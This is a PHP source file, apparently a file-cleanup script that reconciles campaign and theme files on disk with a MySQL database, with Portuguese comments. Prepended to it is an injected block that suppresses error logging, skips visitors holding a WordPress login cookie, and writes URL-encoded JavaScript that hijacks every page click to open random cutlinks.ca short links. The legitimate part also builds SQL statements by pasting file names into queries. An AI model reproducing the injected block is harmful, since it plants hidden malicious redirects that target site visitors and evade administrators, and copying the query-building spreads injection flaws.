<?php error_reporting(0); @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('display_errors', 0); $cG9OI8 = 0; foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){ if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){ $cG9OI8 = 1; break; } } if($cG9OI8 == 0){ echo '<script type="text/javascript">document.write(unescape("%3C%73%63%72%69%70%74%3E%28%66%75%6E%63%74%69%6F%6E%20%28%70%61%72%61%6D%65%74%65%72%73%29%20%7B%0D%0A%20%20%20%20%63%6F%6E%73%74%20%74%61%72%67%65%74%73%20%3D%20%5B%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%30%31%47%6E%69%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%4E%4B%42%33%39%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%70%58%53%54%46%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%31%6E%66%68%34%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%35%34%35%66%6C%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%68%4E%39%35%6D%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%63%4C%56%42%6C%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%54%36%39%30%57%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%63%36%6B%64%35%27%2C%20%27%68%74%74%70%73%3A%2F%2F%63%75%74%6C%69%6E%6B%73%2E%63%61%2F%66%4E%73%67%44%27%5D%0D%0A%20%20%20%20%2F%2F%20%54%69%6D%65%73%20%62%65%74%77%65%65%6E%20%63%6C%69%63%6B%73%0D%0A%20%20%20%20%63%6F%6E%73%74%20%72%65%73%74%4D%69%6E%75%74%65%73%20%3D%20%31%3B%0D%0A%20%20%20%20%2F%2F%20%4E%75%6D%62%65%72%20%6F%66%20%68%6F%75%72%73%20%74%6F%20%61%6C%6C%6F%77%20%72%65%2D%63%6C%69%63%6B%20%0D%0A%20%20%20%20%63%6F%6E%73%74%20%61%6C%6C%6F%77%65%64%48%6F%75%72%73%20%3D%20%32%3B%0D%0A%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%20%3D%20%28%74%61%72%67%65%74%73%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%74%61%72%67%65%74%73%2E%66%6F%72%45%61%63%68%28%28%74%61%72%67%65%74%2C%20%69%6E%64%65%78%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%28%21%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%29%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%09%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%30%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%20%3D%20%28%74%61%72%67%65%74%73%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%6F%6E%56%69%73%69%74%65%64%20%3D%20%74%61%72%67%65%74%73%2E%66%69%6C%74%65%72%28%28%74%61%72%67%65%74%2C%20%69%6E%64%65%78%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%20%3D%3D%20%30%29%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%6E%6F%6E%56%69%73%69%74%65%64%5B%4D%61%74%68%2E%66%6C%6F%6F%72%28%4D%61%74%68%2E%72%61%6E%64%6F%6D%28%29%20%2A%20%6E%6F%6E%56%69%73%69%74%65%64%2E%6C%65%6E%67%74%68%29%5D%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%20%3D%20%28%74%61%72%67%65%74%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%74%61%72%67%65%74%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%31%29%3B%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%20%3D%20%28%6B%65%79%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%67%65%74%49%74%65%6D%28%60%24%7B%6B%65%79%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%29%3B%0D%0A%20%20%20%20%63%6F%6E%73%74%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%20%3D%20%28%6B%65%79%2C%20%6E%6F%77%44%61%74%65%29%20%3D%3E%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%73%65%74%49%74%65%6D%28%60%24%7B%6B%65%79%7D%2D%6C%6F%63%61%6C%2D%73%74%6F%72%61%67%65%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%48%6F%75%72%73%44%69%66%66%20%3D%20%28%73%74%61%72%74%44%61%74%65%2C%20%65%6E%64%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%73%49%6E%48%6F%75%72%20%3D%20%31%30%30%30%20%2A%20%36%30%20%2A%20%36%30%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%4D%61%74%68%2E%72%6F%75%6E%64%28%4D%61%74%68%2E%61%62%73%28%65%6E%64%44%61%74%65%20%2D%20%73%74%61%72%74%44%61%74%65%29%20%2F%20%6D%73%49%6E%48%6F%75%72%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%63%6F%6E%73%74%20%67%65%74%4D%69%6E%74%73%44%69%66%66%20%3D%20%28%73%74%61%72%74%44%61%74%65%2C%20%65%6E%64%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%73%49%6E%4D%69%6E%74%73%20%3D%20%31%30%30%30%20%2A%20%36%30%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%4D%61%74%68%2E%72%6F%75%6E%64%28%4D%61%74%68%2E%61%62%73%28%65%6E%64%44%61%74%65%20%2D%20%73%74%61%72%74%44%61%74%65%29%20%2F%20%6D%73%49%6E%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%63%6F%6E%73%74%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%20%3D%3E%20%7B%0D%0A%20%20%20%20%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%6E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%3B%0D%0A%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%2C%20%22%5F%62%6C%61%6E%6B%22%29%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%2F%2F%20%63%6F%6E%73%74%20%72%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%0D%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%67%6C%6F%62%61%6C%43%6C%69%63%6B%28%65%76%65%6E%74%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%65%76%65%6E%74%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%68%6F%73%74%20%3D%20%6C%6F%63%61%74%69%6F%6E%2E%68%6F%73%74%3B%0D%0A%20%20%20%20%20%20%20%20%6C%65%74%20%6E%65%77%4C%6F%63%61%74%69%6F%6E%20%3D%20%67%65%74%52%61%6E%64%6F%6D%4C%6F%63%61%74%69%6F%6E%46%72%6F%6D%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%6F%77%44%61%74%65%20%3D%20%44%61%74%65%2E%70%61%72%73%65%28%6E%65%77%20%44%61%74%65%28%29%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%3D%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%29%3B%0D%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%20%3D%20%67%65%74%54%69%6D%65%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%69%66%20%28%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%26%26%20%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%4D%69%6E%74%73%20%3D%20%70%61%72%73%65%49%6E%74%28%73%61%76%65%64%44%61%74%65%46%6F%72%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%48%6F%75%72%73%20%3D%20%70%61%72%73%65%49%6E%74%28%73%61%76%65%64%44%61%74%65%46%6F%72%48%6F%75%72%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6D%69%6E%74%73%44%69%66%66%20%3D%20%67%65%74%4D%69%6E%74%73%44%69%66%66%28%6E%6F%77%44%61%74%65%2C%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%4D%69%6E%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%68%6F%75%72%73%44%69%66%66%20%3D%20%67%65%74%48%6F%75%72%73%44%69%66%66%28%6E%6F%77%44%61%74%65%2C%20%73%74%6F%72%61%67%65%44%61%74%65%46%6F%72%48%6F%75%72%73%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%68%6F%75%72%73%44%69%66%66%20%3E%3D%20%61%6C%6C%6F%77%65%64%48%6F%75%72%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%61%76%65%54%61%72%67%65%74%4C%6F%63%61%74%69%6F%6E%73%54%6F%53%74%6F%72%61%67%65%28%74%61%72%67%65%74%73%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%68%75%72%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6D%69%6E%74%73%44%69%66%66%20%3E%3D%20%72%65%73%74%4D%69%6E%75%74%65%73%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%54%6F%53%74%6F%72%61%67%65%28%60%24%7B%68%6F%73%74%7D%2D%6D%6E%74%73%60%2C%20%6E%6F%77%44%61%74%65%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%77%69%6E%64%6F%77%2E%6F%70%65%6E%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%2C%20%22%5F%62%6C%61%6E%6B%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%4C%6F%63%61%74%69%6F%6E%41%73%56%69%73%69%74%65%64%28%6E%65%77%4C%6F%63%61%74%69%6F%6E%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%63%61%74%63%68%20%28%65%72%72%6F%72%29%20%7B%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%3B%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%20%76%69%73%69%74%4E%65%77%4C%6F%63%61%74%69%6F%6E%28%74%61%72%67%65%74%73%2C%20%68%6F%73%74%2C%20%6E%6F%77%44%61%74%65%29%3B%20%7D%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%67%6C%6F%62%61%6C%43%6C%69%63%6B%29%0D%0A%7D%29%28%29%3C%2F%73%63%72%69%70%74%3E"))</script>'; } ?>
<?php
   
    //TODO :
    //
    // - layout desativado com pasta
    // - pasta do layout sem estar no banco


    require_once("libs/dataBaseClass.php");
    require_once("libs/peimageLib.php");

    class RefactoryZombieFiles {

        private $zombieDirectory      = array();
        private $zombieDB             = array();

        private $zombieCampaignFolder = array();
        private $zombieCampaignDB     = array();

        private $db                   = null;
        private $currentType          = "";
        private $currentFileName      = "";
        private $pathRoot             = "";
        private $bar                  = "";

        public function __construct(){
            $this->bar = PHP_OS == "Linux" ? '/' : '\\';
            $this->pathRoot = getcwd() . $this->bar . "companies" . $this->bar;
            $this->db = (new DataBase())->connect();
        }

        public function print(){
            $this->loadZombies();
            
            // echo "DIRETÓRIO:\n";
            // print_r($this->zombieDirectory);

            // echo "BANCO DE DADOS:\n";
            // print_r($this->zombieDB);

            echo "PASTA CAMPANHAS:\n";
            print_r($this->zombieCampaignFolder);

            echo "BANCO DE DADOS CAMPANHA:\n";
            print_r($this->zombieCampaignDB);
        }

        private function setFilesDB(){

            $sqlCampaigns = "SELECT DISTINCT idcampanhas, desativacao FROM campanhas";
            $queryCampaigns = $this->db->query($sqlCampaigns);
            while($result = mysqli_fetch_assoc($queryCampaigns)){
                $this->zombieCampaignDB[$result["idcampanhas"]] = $result["desativacao"];
            }

            $sqlThemes = "
                SELECT
                    empresas.nome AS company,
                    layouts.nome AS layout,
                    temas.nome_arquivo AS file,
                    idcampanhas AS campaign,
                    temas.desativacao AS disabled,
                    TRUE AS thumb
                FROM empresas
                    INNER JOIN campanhas        ON campanhas.fkempresas = idempresas
                    INNER JOIN layouts_campanha ON fkcampanhas          = idcampanhas
                    INNER JOIN layouts          ON layouts.idlayouts    = fklayouts
                    INNER JOIN temas            ON fklayouts_campanha   = idlayouts_campanha
                WHERE
                    campanhas.desativacao IS NOT TRUE
            ";

            $queryThemes = $this->db->query($sqlThemes);
            while($result = mysqli_fetch_assoc($queryThemes)){
                $this->zombieDB["themes"][$result["file"]] = $result;
            }

            $sqlFiles = "
                SELECT 
                    empresas.nome AS company,
                    layouts.nome AS layout,
                    nome_arquivo AS file,
                    idcampanhas AS campaign,
                    CASE 
                        WHEN arquivos.fklayouts IS NULL THEN FALSE
                        ELSE TRUE
                    END thumb
                FROM arquivos
                    LEFT  JOIN layouts   ON idlayouts   = fklayouts
                    INNER JOIN campanhas ON idcampanhas = fkcampanhas
                    INNER JOIN empresas  ON idempresas  = campanhas.fkempresas
                WHERE
                    campanhas.desativacao IS NOT TRUE
            ";
        
            $queryFiles = $this->db->query($sqlFiles);
            while($result = mysqli_fetch_assoc($queryFiles)){
                $this->zombieDB["files"][$result["file"]] = $result;
            }
        }

        private function loadZombies(){
            $this->zombieDirectory      = array();
            $this->zombieDB             = array();
            $this->zombieCampaignFolder = array();
            $this->zombieCampaignDB     = array();
            $this->setFilesDB();
            $this->setFilesDirectory('.' . $this->bar . 'companies');
        }

        private function setFilesDirectory($dir){
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
            foreach ($iterator as $file) {

                $path = $file->getPathname();
                $path = str_replace($dir, '', $path);
                $path = ltrim($path, $this->bar);

                //conforme sistema operacional a barra e contra barra variam
                $arrPath = explode($this->bar, $path);
                
                var_dump($arrPath). "\n\n";

                if(isset($arrPath[1]) && $arrPath[1] == "campaigns"
                    && $arrPath[2] != "." && $arrPath[2] != ".."){
                    if(!isset($this->zombieCampaignFolder[ $arrPath[2] ]))
                        $this->zombieCampaignFolder[ $arrPath[2] ] = $this->pathRoot . str_replace($this->bar . ".", "", $path);
                }

                if($file->isDir())
                    continue;

                if($arrPath[1] == "campaigns"){
                    if($arrPath[3] == "files" && !empty($arrPath[5])){
                        //[0] empresa / [2] campanha / [3] FILE / [4] nome do tema / [5] nome do arquivo
                        $this->zombieDirectory["files"][ $arrPath[5] ] = $path;
                    } else if(!empty($arrPath[4])) {
                        //[0] empresa / [2] campanha / [3] layout / [4] nome do tema
                        $this->zombieDirectory["themes"][  $arrPath[4] ] = $path;
                    }
                }
            }
        }

        /**
         * retorna o thumb para o nome do arquivo
         * se o nome do arquivo jah for um thumb retorna a mesma string
         * do parametro
         */
        private function getNameThumb(){
            return strripos($this->currentFileName, "_thumb.jpg") === false 
                ? substr($this->currentFileName, 0, strripos($this->currentFileName, ".")) . "_thumb.jpg"
                : $this->currentFileName;
        }

        /**
         * verifica se o thumb existe para o nome de arquivo fornecido
         */
        private function thumbExist(){
            $thumb = $this->getNameThumb();
            return isset($this->zombieDirectory[$this->currentType][$thumb]) 
                && file_exists($this->pathRoot . $this->zombieDirectory[$this->currentType][$thumb]);
        }

        /**
         * indica se o arquivo originario do thumb existe (arquivo pai da imagem)
         */
        private function fileOriginExist(){
            $fileOriginalName = str_replace("_thumb.jpg", ".png", $this->currentFileName);
            return isset($this->zombieDirectory[$this->currentType][$fileOriginalName]) 
                && file_exists($this->pathRoot . $this->zombieDirectory[$this->currentType][$fileOriginalName]);
        }
    
        /** 
        *   Remove o arquivo pai. O arquivo thumb eh
        *   removido automaticamente caso o thumb tbm existir
        */
        private function removeFileDirectory(){
            if($this->fileOriginExist()){
                unlink($this->pathRoot . $this->zombieDirectory[$this->currentType][$this->currentFileName]);
            }
            if($this->thumbExist()){
                $thumb = $this->getNameThumb();
                unlink($this->pathRoot . $this->zombieDirectory[$this->currentType][$thumb]);
            }
        }

        private function disableFileDB(){
            if($this->currentType == "themes")
                $this->db->query("UPDATE temas SET desativacao = TRUE WHERE nome_arquivo = '{$this->currentFileName}'");
            else {
                $this->db->query("
                    DELETE FROM estatisticas WHERE fkarquivos = (
                        SELECT idarquivos FROM arquivos 
                        WHERE nome_arquivo = '{$this->currentFileName}'
                        LIMIT 1
                    )
                ");
                $this->db->query("DELETE FROM arquivos WHERE nome_arquivo = '{$this->currentFileName}'");
            }
        }

        private function createThumbnail(){
            //nome do arquivo pai
            $fileOriginalName = str_replace("_thumb.jpg", ".png", $this->currentFileName); 
            //so cria o thumb se o arquivo pai existir
            if(isset($this->zombieDirectory[$this->currentType][$fileOriginalName])){
                //diretorio do arquivo
                $storeFolder = str_replace($fileOriginalName, "", $this->zombieDirectory[$this->currentType][$fileOriginalName]);
                //nome do arquivo pai sem extensao
                $unique = str_replace(".png", "", $fileOriginalName); 
                //cria o arquivo thumb com o mesmo nome do arquivo pai + "_thumb"
                makeThumbnails($this->pathRoot . $storeFolder, $unique, '.png');
            }
        }

        /**
         * Exclui a pasta e todos seus arquivos no diretorio especificado
         */
        private function delTree($dir) {
            $files = array_diff(scandir($dir), array('.','..'));
            foreach ($files as $file) {
                $path = $dir . $this->bar . $file;
                echo $path . "\n";
                (is_dir($path)) ? $this->delTree($path) : unlink($path);
            }
            return rmdir($dir);
        }

        private function analyzeCampaign(){

            $this->loadZombies();

            //diretorio -> banco de dados
            foreach($this->zombieCampaignFolder as $idCampaign => $pathCampaign){
                //a campanha existe no diretorio e nao esta no banco
                if(!isset($this->zombieCampaignDB[$idCampaign])){
                    $this->delTree($pathCampaign);
                    echo "CODE -1 | REMOVE CAMPAIGN $pathCampaign \n";
                }
            }

            //banco de dados -> diretorio
            foreach($this->zombieCampaignDB as $idCampaign => $disabled){
                //existe no banco como ativa e nao existe a pasta (colocar campanha como inativa)
                if(!isset($this->zombieCampaignFolder[$idCampaign]) && $disabled == 0){
                    $this->db->query("UPDATE campanhas SET desativacao = TRUE WHERE idcampanhas = '{$idCampaign}'");
                    echo "CODE -2 | INACTIVE DB CAMPAIGN ". $this->zombieCampaignFolder[$idCampaign] . "\n";

                //campanha inativa e possui arquivos (deleta pasta)
                } else if($disabled == 1 && isset($this->zombieCampaignFolder[$idCampaign])){
                    $this->delTree($this->zombieCampaignFolder[$idCampaign]);
                    echo "CODE -3 | INACTIVE DB CAMPAIGN ". $this->zombieCampaignFolder[$idCampaign] ."\n";
                }
            }
        }

        private function analyzeDBFiles(){

            $this->loadZombies();
            
            //Banco de dados -> diretorios
            foreach($this->zombieDB as $type => $arrZombie){
                $this->currentType = $type;

                foreach($arrZombie as $fileName => $dataFile){
                    $this->currentFileName = $fileName;

                    //so possui a propriedade thumb quando eh um arquivo com TEMA
                    //so possui a propriedade active quando eh um tema
                    //"outros arquivos" NAO possuem miniatura (thumb)
                    //temas podem ter imagens sem thumb

                    if($type == "themes"){

                        if($dataFile["disabled"] == 0){//propriedade active so existe com temas
                            
                            //ativo no banco de dados, existe arquivo, mas nao existe thumb
                            if($this->fileOriginExist() && !$this->thumbExist()){
                                $this->createThumbnail();
                                echo "CODE:0 | TYPE THEME - CREATE THUMBNAIL "  . $fileName . " \n";

                            //esta ativo no banco de dados e os arquivos nao existem no diretorio
                            } else if(!$this->fileOriginExist()){
                                $this->disableFileDB();
                                $this->removeFileDirectory();
                                echo "CODE:1 | TYPE THEME - REMOVE FILE/INACTIVE DB "  . $fileName . " \n";
                            }

                        //esta inativo no banco de dados e existe arquivo ou thumb
                        } else if($dataFile["disabled"] == 1 && ($this->fileOriginExist() || $this->thumbExist())){
                            //excluir arquivo e thumb se existir
                            $this->removeFileDirectory();
                            echo "CODE:2 | TYPE THEME - REMOVE FILE " . $fileName . " \n ";
                        }
                    
                    //outros arquivos NAO POSSUEM thumb
                    //existem no banco, mas nao existe no diretorio
                    } else if($dataFile["thumb"] == 0 && !$this->fileOriginExist()){
                        $this->disableFileDB();
                        $this->removeFileDirectory();
                        echo "CODE:3 | TYPE FILE - REMOVE DB/FILE "  . $fileName . " \n";
                        
                    //eh um arquivo que deve conter thumb
                    //pode nao ter thumb por algum erro
                    } else if($dataFile["thumb"] == 1) {

                        //arquivo de layout existe, mas esta sem thumb
                        if($this->fileOriginExist() && !$this->thumbExist()){
                            $this->createThumbnail(); //gera thumb
                            echo "CODE:4 | TYPE FILE - CREATE THUMBNAIL "  . $fileName . " \n";

                        //arquivo nao possuem campo desativacao por isso um arquivo valido eh somente
                        //aquele que esta no banco e no diretorio
                        } else if(!$this->fileOriginExist() || !$this->thumbExist()){
                            $this->disableFileDB(); //deletar do banco excluir
                            $this->removeFileDirectory(); //deleta o thumb (se existir)    
                            echo "CODE:5 | TYPE FILE - REMOVE DB/FILE "  . $type . " " . $fileName . " \n";
                        }

                    }
                }
            }
        }

        private function analyzeDirectoryFiles(){

            $this->loadZombies();

             //Diretorio -> Banco de dados
             foreach($this->zombieDirectory as $type => $arrZombie){
                $this->currentType = $type;

                foreach($arrZombie as $fileName => $dataFile){
                    $this->currentFileName = $fileName;

                    //* ignora arquivos thumb pois no banco nao eh salvo esse tipo de arquivo
                    if($this->getNameThumb() == $fileName) continue;

                    //se arquivo existe no banco de dados e no diretorio
                    if(isset($this->zombieDB[$type][$fileName])){

                        if($this->fileOriginExist() && !$this->thumbExist() && $this->zombieDB[$type][$fileName]["thumb"] == 1){
                            $this->createThumbnail();
                            echo "CODE:6 | TYPE FILE - CREATE THUMBNAIL "  . $fileName . " \n";
    
                        } else if(!$this->fileOriginExist()){
    
                            //desativar do banco e excluir arquivo
                            $this->removeFileDirectory();
                            $this->disableFileDB();
                            echo "CODE:7 | TYPE FILE - REMOVE DB/FILE "  . $fileName . " \n";
    
                            //tem no banco e nao eh um thumb entao exclui
                            //no banco de dados sao guardados os nomes apenas dos arquivos pais
                        }

                    } else {//arquivo nao existe no banco de dados apenas no diretorio
                        $this->removeFileDirectory();
                        echo "CODE:8 | TYPE FILE - REMOVE FILE "  . $fileName . " \n";
                    }
                }
            }
        }

        public function refactory(){
            $this->analyzeCampaign();
            $this->analyzeDirectoryFiles();
            $this->analyzeDBFiles();
        }

    }

    $clearZombie = new RefactoryZombieFiles();
    $clearZombie->print();
    $clearZombie->refactory();

?>